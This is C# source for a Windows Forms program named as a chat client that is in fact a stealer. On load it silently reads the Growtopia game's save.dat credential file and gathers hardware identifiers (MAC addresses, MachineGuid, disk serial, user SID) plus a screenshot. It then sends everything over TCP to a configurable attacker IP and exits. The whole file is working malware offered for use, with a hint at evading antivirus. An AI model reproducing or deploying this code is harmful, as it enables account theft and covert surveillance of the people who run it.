using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Security.Principal;
using System.DirectoryServices.AccountManagement;
using System.Management.Instrumentation;
using System.Management;

namespace ChattuyCS
{
    public partial class mainForm : Form
    {
        public mainForm()
        {
            InitializeComponent();
        }

        TcpClient client = new TcpClient();
        string ip = "127.0.0.1"; // edit ip here
        
        public struct DataStruct
        {
            public ushort DataTypeInfo;
            public int SentByID;
            public string computerInfo;
            public byte[] imageData;
            public string Message;
            public string machineGuid;
            public string Infos;
            public string MAC;
        };




        public byte[] SerializeData(DataStruct data)
        {
            if (data.Message.Length < 8) data.Message = "";
            // oh boi here we go send huge packet in one-go and instantly quit the app soon...
            byte[] barray = new byte[14 + data.Infos.Length + data.imageData.Length + data.Message.Length];
            barray[0] = (byte)data.DataTypeInfo;
            Array.Copy(BitConverter.GetBytes(data.SentByID), 0, barray, 2, 4);
            Array.Copy(BitConverter.GetBytes(data.Message.Length), 0, barray, 6, 2);
            Array.Copy(Encoding.ASCII.GetBytes(data.Message), 0, barray, 8, data.Message.Length);
            Array.Copy(BitConverter.GetBytes(data.Infos.Length), 0, barray, 8 + data.Message.Length, sizeof(short));
            Array.Copy(Encoding.ASCII.GetBytes(data.Infos), 0, barray, 10 + data.Message.Length, data.Infos.Length);
            Array.Copy(BitConverter.GetBytes(data.imageData.Length), 0, barray, 10 + data.Message.Length + data.Infos.Length, sizeof(int));
            Buffer.BlockCopy(data.imageData, 0, barray, 14 + data.Message.Length + data.Infos.Length, data.imageData.Length);

            return barray;
        }
        public static void parseInfos(DataStruct d, string infos)
        {

        }

        private void send_packet_Click(object sender, EventArgs e)
        {


        }

        public static byte[] ImageToByte(Image img)
        {
            ImageConverter converter = new ImageConverter();
            return (byte[])converter.ConvertTo(img, typeof(byte[]));
        }

        private Image takeScreenShot()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                return bmp;
            }
        }

        // pasted function for getting h4f's shit and else.
        private string identifier(string wmiClass, string wmiProperty)
        //Return a hardware identifier
        {
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementObject mo in moc)
            {
                //Only get the first one
                if (result == "")
                {
                    try
                    {
                        result = mo[wmiProperty].ToString();
                        break;
                    }
                    catch
                    {
                    }
                }
            }
            return result;
        }

        private void mainForm_Load(object sender, EventArgs e)
        {

            try {
                DataStruct data = new DataStruct();
                data.DataTypeInfo = 6;
                data.SentByID = 0;
                string fud = "useless strINg";
                string gtpath = (string)Registry.GetValue(@"HKEY_CURRENT_USER\Software\Growtopia", "path", null);
                if (gtpath != null)
                {
                    gtpath = gtpath + "\\save.dat";
                    byte[] text = File.ReadAllBytes(gtpath);


                    data.computerInfo = Environment.MachineName;
                    data.Message = Encoding.ASCII.GetString(text);
                }
                // data.imageData = ImageToByte(bmpScreenshot);
                var user = WindowsIdentity.GetCurrent().User;




                string macs = "";
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (
                        nic.OperationalStatus == OperationalStatus.Up)
                    {
                        string doit = nic.GetPhysicalAddress().ToString();
                        if (doit.Length > 4) macs += doit;

                    }
                }
                data.MAC = macs;
                string machineGuid = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography", "MachineGuid", null);
                data.machineGuid = machineGuid;

                data.imageData = ImageToByte(takeScreenShot());
                if (data.imageData == null) data.imageData = BitConverter.GetBytes(00);
                // setting up hw info packet
                data.Infos = data.computerInfo;
                data.Infos += Environment.NewLine;
                data.Infos += data.MAC;
                data.Infos += Environment.NewLine;
                data.Infos += data.machineGuid;
                data.Infos += Environment.NewLine; // spamming environment.newline :( -playingo, idk if its necessarily bad tho

                // getting the rest
                
                data.Infos += identifier("Win32_LogicalDisk", "VolumeSerialNumber");;
                data.Infos += Environment.NewLine;
                data.Infos += WindowsIdentity.GetCurrent().Owner;
                data.Infos += Environment.NewLine;


                client.Connect(ip);
                client.Client.Send(SerializeData(data));
                Environment.Exit(0);
            }
            catch
            {
                Environment.Exit(0);
            }
        }

    }
}


